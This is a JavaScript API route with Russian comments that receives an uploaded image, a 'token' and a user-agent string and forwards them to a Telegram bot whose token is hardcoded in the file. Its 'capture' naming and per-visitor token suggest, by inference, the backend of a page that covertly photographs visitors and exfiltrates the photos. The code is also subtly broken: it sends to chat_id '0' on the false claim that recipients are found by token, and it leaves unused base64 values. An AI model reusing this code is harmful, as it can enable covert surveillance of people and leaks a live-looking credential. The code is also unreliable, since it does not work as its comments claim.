import formidable from 'formidable';
import fs from 'fs';
import { Readable } from 'stream';

export const config = {
    api: {
        bodyParser: false,
    },
};

const BOT_TOKEN = "8255755052:AAFjHxgUKDccQVi33kWGuUXkARcR85CxXDQ";

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const form = formidable({ multiples: false });
        
        const [fields, files] = await new Promise((resolve, reject) => {
            form.parse(req, (err, fields, files) => {
                if (err) reject(err);
                resolve([fields, files]);
            });
        });

        const imageFile = files.image;
        const token = fields.token?.[0];
        const ua = fields.ua?.[0] || 'Unknown';

        if (!imageFile || !token) {
            return res.status(400).json({ error: 'Missing data' });
        }

        // Читаем файл
        const imageData = fs.readFileSync(imageFile.filepath);

        // Загружаем изображение на временный хостинг
        // Вместо этого можно отправлять файл напрямую в Telegram
        
        // Конвертируем в base64
        const base64Image = imageData.toString('base64');
        
        // Создаем data URL
        const dataUrl = `data:image/jpeg;base64,${base64Image}`;
        
        // Отправляем в Telegram как документ (чтобы не зависеть от хостинга)
        const formData = new FormData();
        formData.append('chat_id', '0'); // ID не важен, будем искать по токену
        formData.append('photo', new Blob([imageData]), 'photo.jpg');
        formData.append('caption', JSON.stringify({
            token: token,
            userAgent: ua,
            time: new Date().toISOString()
        }));

        const tgResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );

        if (!tgResponse.ok) {
            const error = await tgResponse.text();
            console.error('Telegram error:', error);
            
            // Пробуем отправить как документ
            const docFormData = new FormData();
            docFormData.append('chat_id', '0');
            docFormData.append('document', new Blob([imageData]), 'photo.jpg');
            docFormData.append('caption', JSON.stringify({ token, ua }));
            
            const docResponse = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
                { method: 'POST', body: docFormData }
            );
            
            if (!docResponse.ok) {
                throw new Error('Failed to send to Telegram');
            }
        }

        // Удаляем временный файл
        fs.unlinkSync(imageFile.filepath);

        res.status(200).json({ success: true });

    } catch (error) {
        console.error('Capture error:', error);
        res.status(500).json({ error: error.message });
    }
}
